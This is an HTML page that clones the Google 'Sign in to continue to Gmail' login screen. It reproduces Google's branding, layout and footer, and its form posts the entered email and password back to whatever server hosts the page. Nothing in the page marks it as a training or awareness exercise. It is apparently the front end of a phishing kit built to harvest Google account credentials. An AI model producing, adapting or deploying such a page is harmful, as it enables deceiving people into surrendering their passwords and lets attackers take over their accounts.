<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Sign in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            background: white;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 1px 3px rgba(60, 64, 67, 0.1);
        }

        .logo-container {
            text-align: center;
            margin-bottom: 24px;
        }

        .google-logo {
            display: inline-flex;
            align-items: center;
            gap: 2px;
            font-size: 32px;
            font-weight: 400;
        }

        .google-g { color: #4285F4; }
        .google-o1 { color: #EA4335; }
        .google-o2 { color: #FBBC05; }
        .google-g2 { color: #4285F4; }
        .google-l { color: #34A853; }
        .google-e { color: #EA4335; }

        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin: 16px 0;
            text-align: center;
        }

        .subtitle {
            text-align: center;
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 24px;
        }

        .input-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 8px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        .forgot-email {
            text-align: left;
            margin-top: -16px;
            margin-bottom: 24px;
        }

        .forgot-email a {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-email a:hover {
            text-decoration: underline;
        }

        .info-text {
            background: #f1f3f4;
            border-radius: 4px;
            padding: 12px 16px;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .create-account {
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.3s;
        }

        .next-btn:hover {
            background: #1765cc;
            box-shadow: 0 1px 3px rgba(26, 115, 232, 0.3);
        }

        .next-btn:active {
            background: #1557b0;
        }

        .footer-links {
            margin-top: 32px;
            padding-top: 24px;
            border-top: 1px solid #dadce0;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .footer-links select {
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 4px 8px;
            font-size: 12px;
            color: #5f6368;
            background: white;
        }

        .footer-links .links {
            display: flex;
            gap: 24px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #202124;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 32px 24px;
                border: none;
                box-shadow: none;
            }

            .buttons {
                flex-direction: column-reverse;
                gap: 16px;
                align-items: stretch;
            }

            .next-btn {
                width: 100%;
            }

            .footer-links {
                flex-direction: column;
                gap: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <div class="google-logo">
                <span class="google-g">G</span>
                <span class="google-o1">o</span>
                <span class="google-o2">o</span>
                <span class="google-g2">g</span>
                <span class="google-l">l</span>
                <span class="google-e">e</span>
            </div>
        </div>

        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <form method="POST" action="">
            <div class="input-group">
                <label for="email">Email or phone</label>
                <input type="email" id="email" name="username" placeholder="Enter your email" required autocomplete="email">
            </div>

            <div class="forgot-email">
                <a href="#">Forgot email?</a>
            </div>

            <div class="info-text">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
            </div>

            <div class="input-group">
                <label for="password">Enter your password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>

            <div class="buttons">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>

        <div class="footer-links">
            <select>
                <option>English (United States)</option>
                <option>العربية</option>
                <option>Español</option>
                <option>Français</option>
            </select>
            <div class="links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>
